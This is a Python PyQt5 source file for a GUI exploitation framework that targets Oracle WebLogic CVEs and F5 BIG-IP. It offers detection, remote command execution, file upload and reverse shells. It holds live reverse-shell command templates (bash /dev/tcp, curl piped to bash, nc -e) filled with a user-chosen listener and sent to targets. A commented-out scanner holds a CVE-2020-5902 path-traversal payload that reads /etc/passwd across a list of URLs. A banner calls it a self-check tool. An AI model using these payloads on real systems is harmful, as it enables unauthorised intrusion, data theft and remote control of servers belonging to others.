#!/usr/bin/python3.8
# -*- coding: utf-8 -*-
# @Time    : 2020/6/26 5:51 下午
# @Author  : rocky
# @Email   : 939555035@qq.com
# @File    : run-main.py
# @Software: PyCharm


import sys
from datetime import datetime

import OperatingUi
import importlib
import hashlib
from threading import Thread
from queue import Queue
import ctypes
import inspect
from PyQt5.QtCore import QThread, pyqtSignal, QDateTime, QObject
from PyQt5.QtWidgets import QApplication, QMainWindow, QFileDialog,QTreeWidgetItem

from PyQt5.QtWidgets import QMessageBox
from database.SQLite_tools import SQLite_tools
from linkage.linkage.linkage import linkAllAge
import requests
import time, random
from PyQt5 import QtCore, QtGui, QtWidgets

# 取消SSL证书错误告警
requests.packages.urllib3.disable_warnings()

# Headers 信息配置
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) \
Chrome/53.0.2785.104 Safari/537.36 Core/1.53.4549.400 QQBrowser/9.7.12900.400"
}


def getTime():
    """
    :param message:时间戳 设置
    :return:当前时间
    """
    now = datetime.now()
    return now.strftime('%H:%M:%S')


def showSuccess(message):
    """
    :param message:设置输出样式,带有彩色样式标记
    :return:无返回值
    """
    print('[\033[1;94m{}\033[0;m] [\033[1;92m+\033[0;m] \033[1;92m{}\033[0;m'.format(getTime(), message))


# 主入口
class BackendThread(QThread):
    """
    :param message:主程序入口
    :update_date:
    :update——status:
    :return:无
    """
    # update_date = pyqtSignal(str)
    # update_status = pyqtSignal(str)
    #
    # def __init__(self, thread_num, payload, targetTxtPath, flag):
    #     """
    #     :param message:初始化参数
    #     :param  thread_num:进程数量
    #     :param  payload:攻击载荷
    #     :param  targetTxtPath:文件读取路径
    #     :param  flag:?????
    #     :return:无
    #     """
    #     super(BackendThread, self).__init__()
    #     self.thread_num = thread_num
    #     self.payload = payload
    #     self.targetTxtPath = targetTxtPath
    #     self.flag = flag
    #
    # def __del__(self):
    #     """
    #     :param message:等待
    #     :return:无
    #     """
    #     self.wait()
    #
    # def run(self):
    #     """
    #     :param message:设置队列和扫描任务
    #     :return:无
    #     """
    #     self.url_queue = Queue()
    #     self.start_url_scan(self.thread_num, self.payload, self.flag)
    #
    # def get_base_data(self):
    #     """
    #     :param message:获取文件url，并添加队列
    #     :return:无
    #     """
    #     with open(self.targetTxtPath, "r") as targetTxtPath:
    #         # 自动处理开启文件，处理之后会自动关闭，防止过量读取内容占用内存
    #         url_list = [i.replace("\n", "") for i in targetTxtPath.readlines()]
    #
    #     for url in url_list:
    #         self.url_queue.put(url, block=False)
    #
    # def poc_scan(self, payload):
    #     """
    #     :param message: 获取漏洞POC扫描结果
    #     :param payload: 攻击载荷
    #     :return:
    #     """
    #     while not self.url_queue.empty():  # 判断队列内容是否为空,如果不为空将队列内容循环处理。
    #         # 延迟执行
    #         time.sleep(random.random())
    #         # 逐条获取队列内数据
    #         url = self.url_queue.get()
    #         # 判断获取URL的情况，1、None存在空行导致 2、判断URL 是否为HTTPS开头 3、如果存在HTTP://开头的URL则可能出现BUG
    #         if url is None:
    #             break
    #         elif 'https://' in url:
    #             pass
    #         elif 'https://' not in url and url != '':
    #             url = 'https://' + url
    #         else:
    #             break
    #         # 载入Payload
    #         if payload == 'CVE_2020_5902_BIG_IP_RCE':
    #             payload01 = r'/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
    #             payload02 = r'/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts'
    #         else:
    #             self.update_date.emit("您输入的参数有误!")
    #         url1 = url + payload01
    #         url2 = url + payload02
    #         currentTime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    #         try:
    #             resp1 = requests.get(url1, verify=False, headers=headers, timeout=5)
    #             time.sleep(random.random())
    #             resp2 = requests.get(url2, verify=False, headers=headers, timeout=5)
    #             # resp3 = requests.get('{}/tmui/login.jsp'.format(url), verify=False, timeout=5)
    #             if 'root' in resp1.text or 'localhost' in resp2.text:
    #                 # hostname = re.search(r'<p\stitle=\"(.*?)\">', resp3.text).group(1).strip().lower()
    #                 # self.updata_date.emit('[+]{} : 存在漏洞 {}'.format(url, currentTime))
    #                 self.update_date.emit('[+]{} : 存在漏洞 {}'.format(url, currentTime))
    #                 print('[+]{} : 存在漏洞 {}'.format(url, currentTime))
    #             else:
    #                 self.update_date.emit('[-]{} : 不存在漏洞 {}'.format(url, currentTime))
    #         except requests.exceptions.RequestException as e:
    #             print('[-]{} : 请求超时 {}'.format(url, currentTime))
    #             self.update_date.emit('[-]{} : 请求超时 {}'.format(url, currentTime))
    #             pass
    #
    # def start_url_scan(self, thread_num, payload, flag):
    #     try:
    #         # print(flag)
    #         self.update_status.emit(str(f'扫描启动!'))
    #         self.update_date.emit(str(f'>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'))
    #         self.thread_num = thread_num
    #         self.get_base_data()
    #         threads = []
    #         for i in range(self.thread_num):
    #             t = Thread(target=self.poc_scan, args=(payload,))
    #             t.setDaemon(True)
    #             t.start()
    #             threads.append(t)
    #             if flag == 0:
    #                 self.stop_thread(t)
    #                 # print(flag)
    #             else:
    #                 pass
    #         for t in threads:
    #             t.join()
    #         self.update_status.emit(str(f'扫描完毕!'))
    #         self.url_queue.queue.clear()
    #
    #     except Exception as e:
    #         self.update_date.emit(f'错误信息：{e}')
    #         self.update_date.emit(f'发生错误，请检查输入的简介页URL是否完整、网络设置是否正确')
    #         self.update_date.emit(f'如果不知道什么是“简介页URL”和正确的网络设置，请点击“使用帮助”按钮进行查看')
    #
    # def _async_raise(self, tid, exctype):
    #     """raises the exception, performs cleanup if needed"""
    #     tid = ctypes.c_long(tid)
    #     if not inspect.isclass(exctype):
    #         exctype = type(exctype)
    #     res = ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, ctypes.py_object(exctype))
    #     if res == 0:
    #         raise ValueError("invalid thread id")
    #     elif res != 1:
    #         # """if it returns a number greater than one, you're in trouble,
    #         # and you should call it again with exc=NULL to revert the effect"""
    #         ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, None)
    #         raise SystemError("PyThreadState_SetAsyncExc failed")
    #
    # def stop_thread(self, thread):
    #     self._async_raise(thread.ident, SystemExit)

class MainWindow(QMainWindow, QObject):
    send_args = pyqtSignal(str, int)
    send_sing = pyqtSignal(str)
    commandBasicInfo = pyqtSignal(str)  # 命令执行结果信号获取
    textEditinfo = pyqtSignal(str)
    status_textEdit = pyqtSignal(str)

    def __init__(self, parent=None):
        super(MainWindow, self).__init__(parent)
        self.ui = OperatingUi.Ui_MainWindow()
        self.ui.setupUi(self)
        self.commandBasicInfo.connect(self.handleDisplayCommand)
        self.textEditinfo.connect(self.handlestatusOne)
        self.status_textEdit.connect(self.status_text)
        self.currentTime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

    # ui 变化处理
    def handle_ui_change(self):
        self.ui.tabWidget.tabBar().setVisible(False)
        # pass

    # 所有button的消息与槽的通信
    def handle_buttons(self):
        self.ui.treeWidget.clicked.connect(self.onTreeClicked)

    # 选项卡的联动
    def vul_weblogic(self):
        self.ui.tabWidget.setCurrentIndex(0)

    def setupFunction(self):

        items = ["/bin/bash -i >& /dev/tcp/ip/port 0>&1", "curl ip:port | bash", "nc ip port -e /bin/bash"]
        self.ui.reboundCombo.addItems(items)
        commanditems = ["whoami", "ifconfig",
                        "netstat -an", "id"]
        self.ui.commandCombo.addItems(commanditems)
        command_3items = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17",
                          "18", "19", "20", ]
        self.ui.commandCombo_3.addItems(command_3items)
        self.ui.commondButton_6.clicked.connect(self.send)
        self.ui.emptyButton.clicked.connect(self.clearResult)
        self.ui.commondButton.clicked.connect(self.execcommandPayload)
        self.ui.commondButton_2.clicked.connect(self.uploadfile)
        self.ui.commondButton_4.clicked.connect(self.openfile)
        self.ui.CheckButton.clicked.connect(self.execCheckPayloadb)
        self.ui.reboundButton.clicked.connect(self.startExecReb)
        self.ui.commondButton_3.clicked.connect(self.stop)

        # 导航展示功能
        _translate = QtCore.QCoreApplication.translate
        sql = SQLite_tools()
        sql.create_SQL('./database/db/database.db')
        data = sql.get_SQLtable_column_parent_id('roc_nav_exploit', 'vul_name', 0)

        for vul_name in data:
            vul_name_id = sql.get_SQLtable_vul_name_id('roc_nav_exploit', '{0}'.format(vul_name))
            topLevel = int(vul_name_id) - 1
            self.ui.treeWidget.topLevelItem(topLevel).setText(0, _translate("MainWindow", "{0}".format(vul_name)))

        data = sql.get_SQLtable_column_parent_id('roc_nav_exploit', 'vul_name', 1)

        for vul_name in data:
            vul_name_id = sql.get_SQLtable_vul_name_id('roc_nav_exploit', '{0}'.format(vul_name))
            child_id = int(vul_name_id) - 4
            self.ui.treeWidget.topLevelItem(0).child(child_id).setText(0,_translate("MainWindow", "{0}".format(vul_name)))

        self.run_add_poc()
        self.save_data()



        basicTxt = '''
警告：本工具为漏洞自查工具，请勿非法攻击他人网站！
ROC漏洞综合利用框架采用动态加载配置文件
集成情况：
CVE_2017_3248_weblogic 检测 可用
CVE_2017_10271_weblogic 检测 命令执行 反弹shel 文件上传 可用
CVE_2019_2725_weblogic_10_3_6 检测 命令执行 反弹shell 文件上传 可用
CVE_2019_2729_weblogic_01 检测 命令执行 反弹shell 可用
CVE-2020-14882_weblogic_12_1_3 检测 命令执行 反弹shell 文件上传 可用
后续持续开发
        '''
        self.ui.basicInfoTextEdit.setText(basicTxt)

    def run_add_poc(self):
        """
        导航栏选项卡联动索引0
        :return:
        """
        self.ui.add_nav_index_data_Button.clicked.connect(self.execAddNavIndex)

    def execAddNavIndex(self):
        """
        多线程执行添加漏洞利用导航索引名称
        :return:
        """
        thread = Thread(target=self.addNavIndex)
        thread.start()

    def addNavIndex(self):

        """
        根据前端VIEW获取的导航索引名称插入到数据库里面
        :return:
        """

        vul_line_data = self.ui.vul_lineEdit.text()  # 获取导航栏漏洞利用索引名称
        vul_line_page = self.ui.vul_indexpage_lineEdit.text()
        vul_hash_data = hashlib.md5(b'!@#$').hexdigest() + str(getTime().encode('utf-8')) + str(random.randint(0, 9))
        vul_hash = hashlib.md5(str(vul_hash_data).encode("utf-8")).hexdigest()

        sql = SQLite_tools()
        sql.create_SQL('./database/db/database.db')
        sql.get_SQLtable_column_name('roc_nav_exploit')
        data = sql.get_SQLtable_vul_name_row('roc_nav_exploit', '{0}'.format(vul_line_data))

        if data:
            self.status_textEdit.emit('[+] 添加失败,数据已存在 {0}'.format(self.currentTime))
        else:
            sql.add_roc_nav_exploit_data(vul_line_data, vul_line_page, vul_hash)
            self.status_textEdit.emit('[+] 添加成功 {0}'.format(self.currentTime))

    def status_text(self, data):
        self.ui.status_textEdit.append(data)

    def msg(self):
        reply = QMessageBox.information(self,  # 使用infomation信息框
                                        "标题",
                                        "消息",
                                        QMessageBox.Yes | QMessageBox.No)

    def save_data(self):
        """
        保存请求数据到数据库
        :return:
        """
        # self.ui.save_Button.clicked.connect(self.savaReqData)

    def savaReqData(self):
        """
        保存数据到数据库
        :return:
        """
        vul_name = self.ui.vul_name_lineEdit.text()  # 漏洞名称
        vul_number = self.ui.vul_number_lineEdit.text()  # 漏洞编号
        author = self.ui.author.text()  # 提交作者
        items = [
            "GET", "POST"
        ]
        method_data = self.ui.method_Combo.addItems(items)  # 请求方法
        is_jump_checkBox = self.ui.jump_checkBox.isChecked()  # 是否跳转
        uri_lineEdit = self.ui.uri_lineEdit.text()  # 测试url
        timeout_data = self.ui.timeout_lineEdit.text()  # 请求超时
        verify_data = self.ui.verify_lineEdit.text()  # https
        header_data = self.ui.headerTextEdit.toPlainText()  #
        post_data = self.ui.postTextEdit.toPlainText()  #
        resp_var = self.ui.var_lineEdit.text()  # 响应变量

    def onTreeClicked(self):
        '''
        链接选项卡
        :return:
        '''
        item = self.ui.treeWidget.currentItem().text(0)
        link_data = linkAllAge()
        data = link_data.runlink(item)
        self.ui.tabWidget.setCurrentIndex(int(data))
        QApplication.processEvents()
        vul_number_data = link_data.vul_number_options(item) #每个框架漏洞编号集合
        self.ui.payloadCombo.clear() #清空下拉框数据
        self.ui.payloadCombo.addItems(vul_number_data)

    def send(self):
        # http_url = self.lineEdit.text()    # 获取第一个文本框中的内容
        thread_num = int(self.ui.commandCombo_3.currentText())  # 获取线程数
        payload = self.ui.payloadCombo.currentText()  # 获取漏洞Payload
        targetTxtPath = self.ui.localListenEdit_3.text()  # 获取导入文件路径
        flag = 1
        self.backend = BackendThread(thread_num, payload, targetTxtPath, flag)
        self.backend.update_date.connect(self.handleDisplay)
        self.backend.update_status.connect(self.handlestatus)
        self.backend.start()
        # self.send_args.emit(http_url, thread_num)

    def stop(self):
        """
        结束进程
        :return:
        """
        self.backend.flag = 0
        print(getattr(self.backend, '__dict__'))


    def handleDisplayCommand(self, data):
        """
        显示到ui命令执行后返回的结果信号
        :param data:
        :return:
        """
        self.ui.commandBasicInfoTextEdit.setText(data)

    def handleDisplay(self, data):
        self.ui.commandBasicInfoTextEdit_3.append(data)  # 在指定的区域显示提示信息
        self.cursor = self.ui.commandBasicInfoTextEdit_3.textCursor()
        self.ui.commandBasicInfoTextEdit_3.moveCursor(self.cursor.End)  # 光标移到最后，这样就会自动显示出来
        QApplication.processEvents()  # 一定加上这个功能，不然有卡顿

    def handlestatusOne(self, data):
        self.ui.textEdit.append(data)  # 在指定的区域显示提示信息
        # self.cursor = self.ui.textEdit.textCursor()
        # self.ui.textEdit.moveCursor(self.cursor.End)  # 光标移到最后，这样就会自动显示出来
        QApplication.processEvents()  # 一定加上这个功能，不然有卡顿

    def handlestatus(self, data):
        self.ui.textEdit.append(data)  # 在指定的区域显示提示信息
        self.cursor = self.ui.textEdit.textCursor()
        self.ui.textEdit.moveCursor(self.cursor.End)  # 光标移到最后，这样就会自动显示出来
        QApplication.processEvents()  # 一定加上这个功能，不然有卡顿

    def checkPayload(self):
        '''
        检测payload方法
        :return:
        '''
        targetAddr = self.ui.targetlineEdit.text()  # 获取big页面目标地址
        if 'https://' in targetAddr or 'http://' in targetAddr:
            pass
        else:
            targetAddr = 'http://' + targetAddr


        payload = self.ui.payloadCombo.currentText()
        module = 'controller.rocCheckController'
        importModule = importlib.import_module(module)
        data = importModule.rocCheckController.runCheck(self, targetAddr, payload)
        self.textEditinfo.emit('{}'.format(data['data']))



    def commandPayload(self):
        """
        利用payload命令执行
        :return:
        """
        targetAddr = self.ui.targetlineEdit.text()  # 获取big页面目标地址
        if 'https://' in targetAddr or 'http://' in targetAddr:
            pass
        else:
            targetAddr = 'http://' + targetAddr
        payload = self.ui.payloadCombo.currentText()
        command = self.ui.commandCombo.currentText()
        module = 'controller.rocCommandController'
        importModule = importlib.import_module(module)
        data = importModule.rocCommandController.runCommand(self, targetAddr, payload,command)
        if data['type'] == 'status':
            self.textEditinfo.emit('{}'.format(data['data']))
        elif data['type'] == 'content':
            self.commandBasicInfo.emit('{}'.format(data['data']))
        else:
            self.textEditinfo.emit('type错误')

    def execRebound(self):
        """
        反弹shell
        :return:
        """
        targetAddr = self.ui.targetlineEdit.text()

        targetAddr = self.ui.targetlineEdit.text()  # 获取big页面目标地址
        if 'https://' in targetAddr or 'http://' in targetAddr:
            pass
        else:
            targetAddr = 'http://' + targetAddr
        payload = self.ui.payloadCombo.currentText() # 获取payload编号
        lhost = self.ui.lipaddrlineEdit.text()
        print(lhost)
        lport = self.ui.lport.text()
        print(lport)
        rebound = self.ui.reboundCombo.currentText()

        if rebound == 'curl ip:port | bash':
            reboundData = r'curl {}:{} | bash'.format(lhost, lport)
        elif rebound == '/bin/bash -i >& /dev/tcp/ip/port 0>&1':
            reboundData = r'/bin/bash -i > /dev/tcp/{}/{} 0<&1 2>&1'.format(lhost, lport)
        elif rebound == 'nc ip port -e /bin/bash':
            reboundData = r'nc {} {} -e /bin/bash'.format(lhost, lport)
        else:
            return '操作错误'

        module = 'controller.rocReboundController'
        importModule = importlib.import_module(module)
        data = importModule.rocReboundController.runRebound(self, targetAddr,payload,reboundData)
        self.textEditinfo.emit('{}'.format(data['data']))

    def uploadfile(self):
        """
        上传文件
        :return:
        """
        targetAddr = self.ui.targetlineEdit.text()
        payload = self.ui.payloadCombo.currentText()
        filepath = self.ui.localListenEdit_2.text()
        checkBox = self.ui.checkBox.text() if self.ui.checkBox.isChecked() else ''
        content = self.ui.commandBasicInfoTextEdit_2.toPlainText()

        module = 'controller.rocUploadFileController'
        importModule = importlib.import_module(module)
        getBasePathData = importModule.rocUploadFileController.runGetBasePath(self, targetAddr, payload , command="set")
        filepathAll = getBasePathData['data']



        data = importModule.rocUploadFileController.runUploadFile(self, targetAddr, payload, filepathAll, checkBox, content ,filepath)
        self.textEditinfo.emit('{}'.format(data['data']))

    def batchCheck(self):
        """
        批量检测这一类的漏洞，并返回存在问题的漏洞编号
        :return:
        """
        return ''

    def execCheckPayloadb(self):
        """
        多线程执行检测，防止ui卡死
        :return:
        """
        thread = Thread(target=self.checkPayload)
        thread.start()

    def execcommandPayload(self):
        """
        多线程执行命令，防止ui卡死
        :return:
        """
        thread = Thread(target=self.commandPayload)
        thread.start()

    def startExecReb(self):
        """
        多线程执行反弹，防止ui卡死
        :return:
        """
        thread = Thread(target=self.execRebound)
        thread.start()

    def startUploadFile(self):
        """
        多线程执行文件上传，防止ui卡死
        :return:
        """
        thread = Thread(target=self.uploadfile)
        thread.start()

    def startBatchCheck(self):
        """
        多线程批量检测漏洞,防止
        :return:
        """


    # 打开文件
    def openfile(self):
        fileName1, filetype = QFileDialog.getOpenFileName(self,
                                                          "选取文件",
                                                          "./",
                                                          "All Files (*);;Text Files (*.txt)")  # 设置文件扩展名过滤,注意用双分号间隔

        return self.ui.localListenEdit_3.setText(fileName1)

    def clearResult(self):
        self.ui.textEdit.clear()


if __name__ == '__main__':
    QApplication.processEvents()
    time.sleep(1)
    app = QApplication(sys.argv)
    win = MainWindow()
    win.handle_buttons()
    win.handle_ui_change()
    win.setupFunction()
    win.show()
    sys.exit(app.exec_())
